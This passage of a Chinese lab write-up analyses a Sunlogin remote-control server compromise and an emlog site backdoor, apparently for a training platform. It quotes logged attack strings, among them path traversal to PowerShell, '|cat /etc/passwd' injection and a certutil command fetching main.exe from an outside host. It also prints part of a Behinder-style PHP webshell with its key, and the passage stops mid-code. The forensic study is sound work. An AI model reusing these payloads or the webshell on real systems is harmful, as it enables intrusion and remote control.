+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241202202955618.png" alt="image-20241202202955618"></p>
+<h3 id="问题1-通过本地-PC-RDP到服务器并且找到黑客首次攻击成功的时间为多少"><a href="#问题1-通过本地-PC-RDP到服务器并且找到黑客首次攻击成功的时间为多少" class="headerlink" title="问题1:通过本地 PC RDP到服务器并且找到黑客首次攻击成功的时间为多少"></a>问题1:通过本地 PC RDP到服务器并且找到黑客首次攻击成功的时间为多少</h3><p>解题思路:</p>
+<p>题目让我们提交黑客首次攻击成功的时间，那这题既然主要的是“向日葵”，那肯定就是查日志分析了</p>
+<p>一开始我是直接看的事件查看器</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241202203603773.png" alt="image-20241202203603773"></p>
+<p>但是没发现什么可用的信息，然后我们去看一下向日葵文件的所在文件位置，从里面看看是否有日志文件可用分析</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241202203900337.png" alt="image-20241202203900337"></p>
+<p>有log文件，跟进分析一下</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241202204010946.png" alt="image-20241202204010946"></p>
+<p>因为我们要找的是黑客首次攻击成功的时间，所以我们从最早的文件打开看看</p>
+<p>那打开日志，我们就主要分析以下特征，从而缩小范围进行查找；</p>
+<p>特征</p>
+<ul>
+<li>异常登录记录：</li>
+</ul>
+<p>登录记录从未知或可疑IP地址。</p>
+<p>非常规时间段内的登录行为。</p>
+<ul>
+<li>频繁连接请求：</li>
+</ul>
+<p>短时间内的多次连接尝试，尤其是从相同IP地址。</p>
+<ul>
+<li>失败登录尝试：</li>
+</ul>
+<p>多次失败登录尝试，可能表示暴力破解尝试。</p>
+<ul>
+<li>新设备注册：</li>
+</ul>
+<p>是否有新设备绑定到你的向日葵账户。</p>
+<ul>
+<li>高频操作记录：</li>
+</ul>
+<p>短时间内的高频率操作记录。<br>然后翻日志发现了这个</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241202204636644.png" alt="image-20241202204636644"></p>
+<p>1.这个时间段里有进行过多次的连接尝试，从同一IP地址（192.168.31.45）到目标IP地址（192.168.31.114）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2024</span>-<span class="number">03</span>-<span class="number">21</span> <span class="number">19</span>:<span class="number">54</span>:<span class="number">46.097</span>	- Info  -	[service][TcpAcceptor] <span class="keyword">new</span> acceptor <span class="number">192.168</span>.<span class="number">31.45</span>:<span class="number">63976</span>--&gt;<span class="number">192.168</span>.<span class="number">31.114</span>:<span class="number">49724</span></span><br><span class="line"><span class="number">2024</span>-<span class="number">03</span>-<span class="number">21</span> <span class="number">19</span>:<span class="number">54</span>:<span class="number">53.054</span>	- Info  -	[service][TcpAcceptor] <span class="keyword">new</span> acceptor <span class="number">192.168</span>.<span class="number">31.45</span>:<span class="number">57945</span>--&gt;<span class="number">192.168</span>.<span class="number">31.114</span>:<span class="number">49724</span></span><br><span class="line"><span class="number">2024</span>-<span class="number">03</span>-<span class="number">21</span> <span class="number">19</span>:<span class="number">54</span>:<span class="number">56.066</span>	- Info  -	[service][TcpAcceptor] <span class="keyword">new</span> acceptor <span class="number">192.168</span>.<span class="number">31.45</span>:<span class="number">58485</span>--&gt;<span class="number">192.168</span>.<span class="number">31.114</span>:<span class="number">49724</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的日志记录，可以看出确实是黑客的在进行攻击尝试。这些日志显示了多个HTTP连接尝试，每个连接尝试都有不同的路径和参数，这些路径和参数是漏洞利用或恶意扫描。</p>
+<p>2.<strong>可疑的HTTP路径和参数</strong></p>
+<p>每个连接尝试的路径和参数都显示了对特定资源的访问，这些资源路径和参数是已知漏洞利用的路径。例如：</p>
+<ul>
+<li>&#x2F;pages&#x2F;createpage-entervariables.action?SpaceKey&#x3D;x:</li>
+</ul>
+<p>1.描述：这个请求看起来像是针对某个网页应用框架的攻击尝试，可能是针对 Confluence 的命令注入。</p>
+<p>2.参数：</p>
+<p>SpaceKey&#x3D;x：攻击者尝试通过设置某个参数来利用该漏洞。</p>
+<p>3.目标：通过设置不安全的参数值，可能会导致服务器执行恶意代码或命令。</p>
+<ul>
+<li>&#x2F;CFIDE&#x2F;administrator&#x2F;enter.cfm?locale&#x3D;…&#x2F;…&#x2F;…&#x2F;…&#x2F;…&#x2F;…&#x2F;…&#x2F;lib&#x2F;password.properties%00en:</li>
+</ul>
+<p>1.描述：这是一个目录遍历攻击，它试图通过操纵路径来访问敏感文件。</p>
+<p>2.参数：</p>
+<p>locale&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;lib&#x2F;password.properties%00en：攻击者使用了目录遍历 (..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;) 和空字符 (%00) 来访问本不应公开的 password.properties 文件。</p>
+<p>3.目标：读取或修改配置文件，可能包含敏感信息如密码。</p>
+<ul>
+<li>&#x2F;mailsms&#x2F;s?func&#x3D;ADMIN</li>
+</ul>
+<p>&amp;dumpConfig&#x3D;&#x2F;:</p>
+<p>1.描述：这个请求试图利用一个功能（可能是一个管理功能）来获取系统配置信息。</p>
+<p>2.参数：</p>
+<p>func&#x3D;ADMIN:appState&amp;dumpConfig&#x3D;&#x2F;：这个参数组合看起来像是试图调用一个管理命令 (ADMIN:appState) 并将配置信息导出。</p>
+<p>3.目标：获取系统配置和状态信息，可能包括敏感数据。</p>
+<ul>
+<li>&#x2F;manager&#x2F;radius&#x2F;server_ping.php?ip&#x3D;127.0.0.1|cat%20&#x2F;etc&#x2F;passwd</li>
+</ul>
+<p>这里的话就是尝试进行rce的操作，试图使用cat查看我们的本地文件</p>
+<p>所以这几个url分析下来就是黑客在尝试利用<strong>CNVD-2022-10207：向日葵远程控制软件 RCE 漏洞。</strong></p>
+<p>那什么是<strong>CNVD-2022-10207：向日葵远程控制软件 RCE 漏洞</strong>呢?</p>
+<ul>
+<li>漏洞背景</li>
+</ul>
+<p>CNVD-2022-10207 是一个被发现的安全漏洞，允许未经授权的攻击者远程执行任意命令。</p>
+<ul>
+<li>漏洞成因</li>
+</ul>
+<p>该漏洞的成因通常涉及以下几个方面：</p>
+<ol>
+<li><p>输入验证缺陷：软件在处理用户输入时，未能正确验证和过滤特定的输入数据。</p>
+</li>
+<li><p>路径处理不当：软件在处理文件路径时，可能存在目录遍历漏洞，允许攻击者访问任意文件。</p>
+</li>
+<li><p>功能滥用：某些管理功能未受到足够的保护，可以被远程调用，执行敏感操作。</p>
+</li>
+</ol>
+<ul>
+<li>攻击过程</li>
+</ul>
+<ol>
+<li><p>发送特制请求：攻击者构造特定的 HTTP 请求，利用软件的输入验证缺陷或路径处理不当。</p>
+</li>
+<li><p>远程执行命令：通过特制请求，攻击者可以执行任意系统命令或脚本。</p>
+</li>
+<li><p>获取权限：成功利用漏洞后，攻击者可能获得系统的控制权，执行进一步的恶意操作。</p>
+</li>
+</ol>
+<ul>
+<li>影响</li>
+</ul>
+<ol>
+<li>远程命令执行：攻击者可以在目标系统上执行任意命令，导致系统被完全控制。</li>
+<li>数据泄露：攻击者可以访问和窃取系统中的敏感数据。</li>
+<li>进一步渗透：攻击者可以利用被控制的系统作为跳板，攻击网络内的其他设备。</li>
+</ol>
+<p>所以从这里看的话其实只是黑客的一次次尝试利用漏洞进行攻击，但是并没有攻击成功，所以我们还需要继续分析日志文件</p>
+<p>终于在最底下发现了一些奇怪的地方</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241202210129658.png" alt="image-20241202210129658"></p>
+<p>简单分析一下这里</p>
+<p>首先是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+whoami</span><br><span class="line">/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+pwd</span><br></pre></td></tr></table></figure>
+
+<p>这里的命令表明黑客在通过路径遍历去访问并执行powershell命令，这些命令的目的是验证是否能够成功执行系统命令。<code>whoami</code>命令用于查看当前执行命令的用户，<code>pwd</code>命令用于查看当前工作目录。</p>
+<p>日志中多次记录了从攻击者IP（192.168.31.45）到目标IP（192.168.31.114）的HTTP连接，表明攻击者正在反复尝试连接和执行命令。</p>
+<p>所以这里的话可用想到应该是黑客攻击成功了然后在进行测试执行命令是否正常，以确认权限级别和工作目录</p>
+<p><strong>日志记录表明，攻击者在2024年3月26日10:16:25通过路径遍历和命令注入成功执行了PowerShell命令。</strong></p>
+<h3 id="问题2-通过本地-PC-RDP到服务器并且找到黑客攻击的-IP-为多少"><a href="#问题2-通过本地-PC-RDP到服务器并且找到黑客攻击的-IP-为多少" class="headerlink" title="问题2:通过本地 PC RDP到服务器并且找到黑客攻击的 IP 为多少"></a>问题2:通过本地 PC RDP到服务器并且找到黑客攻击的 IP 为多少</h3><p>这个的话我们刚刚一直都可以看到日志文件中有一个经常出现的ip地址，就可能是黑客攻击的ip，也就是192.168.31.45</p>
+<h3 id="问题3-通过本地-PC-RDP到服务器并且找到黑客托管恶意程序-IP-为"><a href="#问题3-通过本地-PC-RDP到服务器并且找到黑客托管恶意程序-IP-为" class="headerlink" title="问题3:通过本地 PC RDP到服务器并且找到黑客托管恶意程序 IP 为"></a>问题3:通过本地 PC RDP到服务器并且找到黑客托管恶意程序 IP 为</h3><p>这个的话是需要找到托管恶意程序的ip，我们还是需要继续分析日志文件，然后往下翻又看到了别的</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241202211458248.png" alt="image-20241202211458248"></p>
+<p>这里的话我们也分析一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2024</span>-<span class="number">03</span>-<span class="number">26</span> <span class="number">10</span>:<span class="number">31</span>:<span class="number">07.538</span>	- Info  -	[service][TcpAcceptor] <span class="keyword">new</span> acceptor <span class="number">192.168</span>.<span class="number">31.45</span>:<span class="number">49328</span>--&gt;<span class="number">192.168</span>.<span class="number">31.114</span>:<span class="number">49724</span></span><br><span class="line"><span class="comment">#从IP 192.168.31.45 发起了到IP 192.168.31.114 的新连接</span></span><br><span class="line"><span class="number">2024</span>-<span class="number">03</span>-<span class="number">26</span> <span class="number">10</span>:<span class="number">31</span>:<span class="number">07.538</span>	- Info  -	[Acceptor][HTTP] <span class="keyword">new</span> RC HTTP connection <span class="number">192.168</span>.<span class="number">31.45</span>:<span class="number">49328</span>, path: /cgi-bin/rpc?action=verify-haras, version: HTTP/<span class="number">1.1</span></span><br><span class="line"><span class="comment">#尝试访问路径 /cgi-bin/rpc?action=verify-haras</span></span><br><span class="line"><span class="number">2024</span>-<span class="number">03</span>-<span class="number">26</span> <span class="number">10</span>:<span class="number">31</span>:<span class="number">07.538</span>	- Info  -	[Acceptor][HTTP] <span class="keyword">new</span> RC HTTP connection <span class="number">192.168</span>.<span class="number">31.45</span>:<span class="number">49328</span>,/cgi-bin/rpc?action=verify-haras, plugin:cgi-bin, session:</span><br><span class="line"><span class="number">2024</span>-<span class="number">03</span>-<span class="number">26</span> <span class="number">10</span>:<span class="number">31</span>:<span class="number">07.576</span>	- Info  -	[service][TcpAcceptor] <span class="keyword">new</span> acceptor <span class="number">192.168</span>.<span class="number">31.45</span>:<span class="number">49329</span>--&gt;<span class="number">192.168</span>.<span class="number">31.114</span>:<span class="number">49724</span></span><br><span class="line"><span class="number">2024</span>-<span class="number">03</span>-<span class="number">26</span> <span class="number">10</span>:<span class="number">31</span>:<span class="number">07.576</span>	- Info  -	[Acceptor][HTTP] <span class="keyword">new</span> RC HTTP connection <span class="number">192.168</span>.<span class="number">31.45</span>:<span class="number">49329</span>, path: /check?cmd=ping..%<span class="number">2</span>F..%<span class="number">2</span>F..%<span class="number">2</span>F..%<span class="number">2</span>F..%<span class="number">2</span>F..%<span class="number">2</span>F..%<span class="number">2</span>F..%<span class="number">2</span>F..%<span class="number">2</span>Fwindows%<span class="number">2</span>Fsystem32%<span class="number">2</span>FWindowsPowerShell%<span class="number">2</span>Fv1.<span class="number">0</span>%<span class="number">2</span>Fpowershell.exe+certutil+-urlcache+-split+-f+http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F192.<span class="number">168.31</span>.<span class="number">249</span>%<span class="number">2</span>Fmain.exe, version: HTTP/<span class="number">1.1</span></span><br><span class="line"><span class="comment">#访问的路径为 /check?cmd=ping...，其中包含了一个可能的命令注入尝试，且连接尝试执行 powershell.exe 和 certutil 的组合命令</span></span><br><span class="line"><span class="number">2024</span>-<span class="number">03</span>-<span class="number">26</span> <span class="number">10</span>:<span class="number">31</span>:<span class="number">07.576</span>	- Info  -	[Acceptor][HTTP] <span class="keyword">new</span> RC HTTP connection <span class="number">192.168</span>.<span class="number">31.45</span>:<span class="number">49329</span>,/check?cmd=ping..%<span class="number">2</span>F..%<span class="number">2</span>F..%<span class="number">2</span>F..%<span class="number">2</span>F..%<span class="number">2</span>F..%<span class="number">2</span>F..%<span class="number">2</span>F..%<span class="number">2</span>F..%<span class="number">2</span>Fwindows%<span class="number">2</span>Fsystem32%<span class="number">2</span>FWindowsPowerShell%<span class="number">2</span>Fv1.<span class="number">0</span>%<span class="number">2</span>Fpowershell.exe+certutil+-urlcache+-split+-f+http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F192.<span class="number">168.31</span>.<span class="number">249</span>%<span class="number">2</span>Fmain.exe, plugin:check, session:sobGzXzWBfSlSbdqnmkUbJMLEjhssRx1</span><br></pre></td></tr></table></figure>
+
+<p>这里的话关键点在于</p>
+<ul>
+<li>恶意行为：</li>
+</ul>
+<ol>
+<li><p>路径遍历：&#x2F;check?cmd&#x3D;ping…. 是一种路径遍历尝试，试图访问系统中的powershell.exe。</p>
+</li>
+<li><p>命令执行：使用 certutil 工具下载文件 main.exe。路径是 <a target="_blank" rel="noopener" href="http://192.168.31.249/main.exe%EF%BC%8C%E8%BF%99%E9%87%8C%E7%9A%84%E8%AF%9D%E5%8F%AF%E8%83%BD%E6%98%AF%E4%BB%8E%E5%A4%96%E9%83%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8B%E8%BD%BD%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%EF%BC%8C%E5%8F%AF%E8%83%BD%E6%8C%87%E5%90%91%E4%B8%80%E4%B8%AA%E5%8F%AF%E8%83%BD%E6%89%98%E7%AE%A1%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%A4%96%E9%83%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%82">http://192.168.31.249/main.exe，这里的话可能是从外部服务器下载恶意文件，可能指向一个可能托管恶意程序的外部服务器。</a></p>
+</li>
+</ol>
+<p>这些日志条目显示了黑客尝试利用路径遍历和命令注入漏洞，通过 <code>certutil</code> 从外部服务器（192.168.31.249）下载并执行恶意程序 <code>main.exe</code>。这表明黑客的攻击成功了，且试图在目标系统上下载并运行恶意软件。</p>
+<p>所以这个192.168.31.249可能就是黑客用于下载恶意程序的ip，我们直接交flag就行</p>
+<h3 id="问题4-找到黑客解密-DEC-文件"><a href="#问题4-找到黑客解密-DEC-文件" class="headerlink" title="问题4:找到黑客解密 DEC 文件"></a>问题4:找到黑客解密 DEC 文件</h3><p>题目让我们提交黑客解密的DEC文件的md5值，那我们先了解一下什么样的是DEC文件</p>
+<p>DEC文件：DEC文件通常是与某些特定软件或硬件相关的数据文件，可能包含特定格式的数据。 .dec 文件<strong>定义了公开的数据和接口，供其他模块使用</strong>。</p>
+<p>然后我们先在日志文件里搜索一下DEC文件看看有没有什么收获</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241202212513158.png" alt="image-20241202212513158"></p>
+<p>好吧什么都没找到，那就老老实实的分析日志文件吧</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241202212626252.png" alt="image-20241202212626252"></p>
+<p>在这里发现了一个qq.txt文件，前面是647224830</p>
+<p>QQ搜索发现是玄机的官方群，但是一群满了，在二群的群文件里面找到了一个DEC文件</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241202212839578.png" alt="image-20241202212839578"></p>
+<p>下载下来是一个DEC.pem，这个应该就是我们想要的文件名，拿去md5加密然后交flag就可以了</p>
+<h3 id="问题5-通过本地-PC-RDP到服务器并且解密黑客勒索软件-将桌面加密文件中关键信息作为-FLAG-提交"><a href="#问题5-通过本地-PC-RDP到服务器并且解密黑客勒索软件-将桌面加密文件中关键信息作为-FLAG-提交" class="headerlink" title="问题5:通过本地 PC RDP到服务器并且解密黑客勒索软件,将桌面加密文件中关键信息作为 FLAG 提交;"></a>问题5:通过本地 PC RDP到服务器并且解密黑客勒索软件,将桌面加密文件中关键信息作为 FLAG 提交;</h3><p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241202213122277.png" alt="image-20241202213122277"></p>
+<p>桌面上可以看到有两个文件，分别用记事本打开</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241202213250339.png" alt="image-20241202213250339"></p>
+<p>一开始并没有看出来什么，但是想到刚刚的dec文件，发现是RSA解密，那就直接用在线解密去做就行</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241202213456122.png" alt="image-20241202213456122"></p>
+<p>解密结果</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/QQ20241121-201005.png"></p>
+<p>然后是AES解密</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241202214607706.png" alt="image-20241202214607706"></p>
+<p>就可以拿到flag了</p>
+<h2 id="第四章-windows实战-emlog"><a href="#第四章-windows实战-emlog" class="headerlink" title="第四章 windows实战-emlog"></a>第四章 windows实战-emlog</h2><p>参考师傅的文章:</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/administratorlws/article/details/140125250?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522177e608dfc6e06a4223b92d0810c0900%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=177e608dfc6e06a4223b92d0810c0900&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-140125250-null-null.nonecase&utm_term=%E7%AC%AC%E5%9B%9B%E7%AB%A0&spm=1018.2226.3001.4450">https://blog.csdn.net/administratorlws/article/details/140125250?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522177e608dfc6e06a4223b92d0810c0900%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=177e608dfc6e06a4223b92d0810c0900&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-140125250-null-null.nonecase&amp;utm_term=%E7%AC%AC%E5%9B%9B%E7%AB%A0&amp;spm=1018.2226.3001.4450</a></p>
+<p>首先我们要了解什么是emlog</p>
+<h3 id="什么是emlog？"><a href="#什么是emlog？" class="headerlink" title="什么是emlog？"></a>什么是emlog？</h3><p>Emlog 是一个开源的博客系统，采用 PHP 和 MySQL 开发，旨在帮助用户轻松创建和管理博客，Emlog 的设计理念是简洁、高效和轻量，适合个人用户和小型网站。</p>
+<h3 id="emlog的特点"><a href="#emlog的特点" class="headerlink" title="emlog的特点"></a>emlog的特点</h3><ol>
+<li><strong>简洁易用</strong></li>
+</ol>
+<p>Emlog 的用户界面设计简洁，易于理解和使用，即使对于初学者也能快速上手。用户可以通过后台管理面板轻松发布和管理文章。</p>
+<ol start="2">
+<li><strong>多种主题和插件</strong></li>
+</ol>
+<p>Emlog 允许用户自定义自己的博客外观和功能。用户可以选择不同的主题以及安装各种插件，以增强博客的功能性和美观性。</p>
+<ol start="3">
+<li><strong>SEO 友好</strong></li>
+</ol>
+<p>Emlog 提供了一些内置的 SEO 功能，帮助用户优化网站，以提高搜索引擎排名。这些功能包括自定义 URL、元标签设置等。</p>
+<ol start="4">
+<li><strong>多用户支持</strong></li>
+</ol>
+<p>Emlog 支持多用户管理，允许多个用户在同一个博客上发布文章，并可以设置不同的权限和角色。</p>
+<ol start="5">
+<li><strong>灵活的文章管理</strong></li>
+</ol>
+<p>用户可以方便地管理文章，包括分类、标签、评论等。Emlog 还支持草稿功能，用户可以在发布前保存未完成的文章。</p>
+<ol start="6">
+<li><strong>数据备份与恢复</strong></li>
+</ol>
+<p>Emlog 提供了数据备份和恢复的功能，用户可以定期备份自己的博客数据，防止数据丢失。</p>
+<ol start="7">
+<li><strong>社区支持</strong></li>
+</ol>
+<p>作为一个开源项目，Emlog 拥有活跃的开发者社区和用户群体，用户可以在社区论坛寻求帮助、分享经验和获取资源。</p>
+<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><ul>
+<li>个人博客</li>
+</ul>
+<p>Emlog 适合个人用户创建和管理博客，记录日常生活和思想。</p>
+<ul>
+<li>小型网站</li>
+</ul>
+<p>由于其轻量级和高效性，Emlog 也适合用于创建小型企业网站或作品展示网站。</p>
+<ul>
+<li>自媒体平台</li>
+</ul>
+<p>自媒体从业者可以使用 Emlog 搭建个人博客平台，发布和管理内容，建立个人品牌。</p>
+<p>由于其低门槛和灵活性，适合不具备深厚技术背景的用户使用。</p>
+<h3 id="连接靶机-1"><a href="#连接靶机-1" class="headerlink" title="连接靶机"></a>连接靶机</h3><p>前面讲过了，步骤是一样的，不会的可以返回去看一下</p>
+<h3 id="问题1-通过本地-PC-RDP到服务器并且找到黑客植入-shell-将黑客植入-shell-的密码提交"><a href="#问题1-通过本地-PC-RDP到服务器并且找到黑客植入-shell-将黑客植入-shell-的密码提交" class="headerlink" title="问题1:通过本地 PC RDP到服务器并且找到黑客植入 shell,,将黑客植入 shell 的密码提交"></a>问题1:通过本地 PC RDP到服务器并且找到黑客植入 shell,,将黑客植入 shell 的密码提交</h3><p>简单来说就是找shell嘛，前面的章节里面也有关于查杀webshell的方法，这里的话我们还是先找一下切入点</p>
+<p>简单扫一眼，桌面上发现“PHPStudy”，PHPStudy是一款集成了 PHP、Apache、MySQL、Nginx 等常用 Web 开发环境的本地集成开发环境工具。简单来说就是用来搭建网站的，既然是搭建网站的，那黑客肯定会从这边下手</p>
+<p>那我们先打开phpstudy的文件所在文件夹</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203151326710.png" alt="image-20241203151326710"></p>
+<p>不过这个目录的话不算是phpstudy的目录，我们返回上一级</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203151434007.png" alt="image-20241203151434007"></p>
+<p>这里可以看到有两个www的文件夹，这里的www文件夹代表着什么呢？在 PHPStudy Pro 中，WWW 目录通常是存放 Web 项目的根目录。这个目录是 Apache 或 Nginx 等 Web 服务器的默认站点目录，所有的 Web 项目文件和代码都会放在这个目录中。</p>
+<p><strong>总之，WWW 目录是 PHPStudy Pro 中存放所有 Web 项目文件的地方，是开发和测试 Web 应用的核心目录。</strong></p>
+<p>这里的话手动排查比较麻烦，我们直接上科技，用D盾进行查杀webshell</p>
+<p>我们把里面的WWW文件拖出来放到我们本地桌面，接着使用D盾进行扫描WWW目录；</p>
+<p>一开始没扫出来以为是我文件复制出问题了，后来发现是电脑的实时保护没开，系统自动把木马文件杀了</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203153140327.png" alt="image-20241203153140327"></p>
+<p>直接就看到目录了，我们跟着目录进去看一下这个shell.php文件</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203153223296.png" alt="image-20241203153223296"></p>
+<p>然后就可以看到shell的连接密码，应该就是我们题目中想要的东西了</p>
+<p>但是我们还是来分析一下这个shell文件</p>
+<p><strong>这是一个典型的后门程序（backdoor shell），包含了一些隐蔽和加密的特性。</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);<span class="comment">#关闭错误报告</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();<span class="comment">#启动新会话</span></span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; <span class="comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span></span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;<span class="comment">#将密钥存储在会话变量中。</span></span><br><span class="line">	<span class="title function_ invoke__">session_write_close</span>();<span class="comment">#写入会话数据并关闭会话存储</span></span><br><span class="line">	<span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);<span class="comment">#从请求的原始输入中读取数据，通常用于POST请求。</span></span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))<span class="comment">#检查是否加载了OpenSSL扩展</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">		<span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    			 <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">	&#125;<span class="comment">#如果没有，则使用基于字符异或的自定义解密方法；如果有，则使用OpenSSL的AES解密。</span></span><br><span class="line">    <span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);<span class="comment">#将解密后的数据用 | 分割成一个数组，第一个元素是函数名，第二个元素是参数。</span></span><br><span class="line">    <span class="variable">$func</span>=<span 